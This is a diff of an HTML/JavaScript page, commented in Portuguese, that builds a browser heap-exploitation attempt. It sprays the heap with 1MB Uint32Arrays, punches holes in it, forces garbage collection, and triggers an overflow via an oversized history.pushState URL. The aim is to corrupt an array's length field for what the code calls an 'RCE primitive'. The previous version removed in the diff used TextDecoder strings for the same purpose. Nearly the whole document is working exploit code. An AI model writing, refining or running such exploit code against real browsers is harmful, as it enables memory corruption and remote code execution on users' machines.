@@ -1,130 +1,122 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Wide Range Scanner (-128 bytes)</title>
+    <title>Titan Array Attack (Uint32Array)</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; margin-bottom: 20px; }
+        body { background-color: #001; color: #0ff; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0ff; background: #000; color: #fff; cursor: pointer; margin-bottom: 10px; }
         #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
-        .hit { color: yellow; font-weight: bold; }
+        .win { background-color: #0ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; }
     </style>
 </head>
 <body>
 
-    <h1>Scanner de Amplo Espectro (-128 bytes)</h1>
-    <p>Procurando o campo Length em uma área maior antes dos dados.</p>
+    <h1>Titan Array Attack</h1>
+    <p>Alvo: Uint32Array de 1MB (Large Heap). Objetivo: Corromper .length</p>
 
-    <button onclick="startWideScan()">INICIAR VARREDURA PROFUNDA</button>
+    <button onclick="startArrayAttack(0)">TIRO DIRETO (Offset 709.520)</button>
+    <button onclick="startArrayAttack(16)">TIRO RECUADO -16 (Tenta pegar Vector Ptr)</button>
+    <button onclick="startArrayAttack(24)">TIRO RECUADO -24 (Tenta pegar Length)</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        // Ponto onde acertamos os DADOS (Referência)
-        const DATA_HIT = 709520;
+        const BASE_OFFSET = 709520;
         const OVERFLOW_AMT = 1024 * 64; 
 
-        // Configuração da Vítima (1MB TextDecoder)
-        const TARGET_SIZE = 1024 * 1024; 
-        const PAYLOAD_SIZE = TARGET_SIZE - 24; 
+        // 1MB em bytes = 262144 elementos de 4 bytes (Uint32)
+        const ARRAY_BYTES = 1024 * 1024;
+        const ELEMENT_COUNT = ARRAY_BYTES / 4; 
 
         var victims = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
+            let cls = type === 'win' ? 'class="win"' : '';
             el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-        async function startWideScan() {
-            // Vamos recuar de 0 até 128 bytes, de 8 em 8.
-            // Isso cobre cabeçalhos grandes de alocadores como jemalloc/bmalloc.
+        async function startArrayAttack(offsetAdjust) {
+            // O offset real é a base MENOS o ajuste (para tentar acertar antes dos dados)
+            let currentOffset = BASE_OFFSET - offsetAdjust;
             
-            for (let offsetBack = 0; offsetBack <= 128; offsetBack += 8) {
-                let currentOffset = DATA_HIT - offsetBack;
-                
-                log(`------------------------------------------`);
-                log(`TESTANDO OFFSET: ${currentOffset} (Recuo -${offsetBack})`);
-                
-                // Limpa memória anterior
-                victims = [];
-                await forceGC();
-                await sleep(100);
+            log(`--- INICIANDO ATAQUE (Offset ${currentOffset}) ---`);
+            log(`Criando Uint32Arrays de 1MB (${ELEMENT_COUNT} elementos)...`);
 
-                let result = await runTestAtOffset(currentOffset);
-                
-                if (result === "RCE") return; // Venceu
-                if (result === "DATA") {
-                    log(`Ainda em DADOS. Precisa recuar mais...`, 'hit');
-                }
+            // 1. SPRAY
+            victims = [];
+            for(let i=0; i<100; i++) {
+                let arr = new Uint32Array(ELEMENT_COUNT);
+                // Preenche com marcador 0xCCCCCCCC
+                arr[0] = 0xCCCCCCCC; 
+                arr[1] = 0xDDDDDDDD;
+                // Preenche o final para checar integridade
+                arr[ELEMENT_COUNT - 1] = 0xEEEEEEEE;
+                victims.push(arr);
             }
-            log("Fim da varredura.");
+
+            // 2. BURACOS
+            log("Criando buracos no Large Heap...");
+            for(let i=0; i<100; i+=2) {
+                victims[i] = null;
+            }
+
+            await forceGC();
+
+            // 3. EXPLOIT
+            log("Disparando Overflow...");
+            setTimeout(() => {
+                try {
+                    let buffer = "A".repeat(currentOffset);
+                    buffer += "\x01".repeat(OVERFLOW_AMT);
+                    
+                    history.pushState({}, "array_pwn", "/" + buffer);
+
+                    log("Verificando arrays...");
+                    checkArrays(ELEMENT_COUNT);
+
+                } catch (e) {
+                    log("Erro no Exploit: " + e.message);
+                }
+            }, 500);
         }
 
-        async function runTestAtOffset(offset) {
-            try {
-                // 1. Preparar Strings 1MB (8-bit)
-                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-                rawBuffer.fill(0x42); 
-                let decoder = new TextDecoder("utf-8");
-                let baseString = decoder.decode(rawBuffer);
+        function checkArrays(originalLen) {
+            let success = false;
+            for(let i=1; i<victims.length; i+=2) {
+                let arr = victims[i];
+                if(!arr) continue;
 
-                // 2. Spray
-                victims = [];
-                for(let i=0; i<60; i++) {
-                    let s = i + "_" + baseString.substring((i+"_").length);
-                    victims.push(s);
+                // CASO 1: LENGTH CORROMPIDO (O Santo Graal)
+                // Se o length mudou, ganhamos acesso a memória alheia
+                if (arr.length !== originalLen) {
+                    log(`!!! JACKPOT !!! Array ${i} Length Corrompido!`, 'win');
+                    log(`Original: ${originalLen} | Novo: ${arr.length}`, 'win');
+                    alert("RCE PRIMITIVE: ARRAY LENGTH!");
+                    success = true;
+                    break;
                 }
 
-                // 3. Buracos
-                for(let i=0; i<60; i+=2) victims[i] = null;
-                await forceGC();
-
-                // 4. Exploit
-                // Preenche até o offset atual e manda 0x01
-                let buffer = "A".repeat(offset);
-                buffer += "\x01".repeat(OVERFLOW_AMT);
+                // CASO 2: DADOS CORROMPIDOS
+                // Se o conteúdo mudou para 0x01010101
+                if (arr[0] === 0x01010101) {
+                     log(`!!! SUCESSO PARCIAL !!! Dados atingidos no Array ${i}`, 'win');
+                     log("Nota: Acertamos o corpo, precisamos recuar para acertar o header.");
+                     success = true;
+                     break;
+                }
                 
-                history.pushState({}, "scan_" + offset, "/" + buffer);
-
-                // 5. Checagem
-                for(let i=1; i<victims.length; i+=2) {
-                    let s = victims[i];
-                    if(!s) continue;
-
-                    try {
-                        let err = new Error(s);
-                        let msg = err.message;
-
-                        // CASO 1: LENGTH CORROMPIDO (VITÓRIA)
-                        if (msg.length !== PAYLOAD_SIZE) {
-                            log(`!!! JACKPOT !!! Length alterado no recuo -${DATA_HIT - offset}`, 'win');
-                            log(`Novo Tamanho: ${msg.length}`, 'win');
-                            alert("RCE PRIMITIVE UNLOCKED!");
-                            return "RCE";
-                        }
-                        
-                        // CASO 2: CONTEÚDO CORROMPIDO (DADOS)
-                        // Se o primeiro byte virou 1, ainda estamos na zona de dados
-                        if (msg.charCodeAt(0) === 1) {
-                            return "DATA";
-                        }
-
-                    } catch(e) {}
-                }
-
-            } catch(e) {
-                log("Erro (OOM): " + e.message);
+                // CASO 3: PONTEIRO CORROMPIDO (Crash Potencial)
+                // Se o array travar ao ler, é sinal de que zoamos o ponteiro de dados
             }
-            return "FAIL";
+
+            if(!success) log("Nenhum array atingido.");
         }
 
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 400));
+            return new Promise(r => setTimeout(r, 800));
         }
     </script>
 </body>
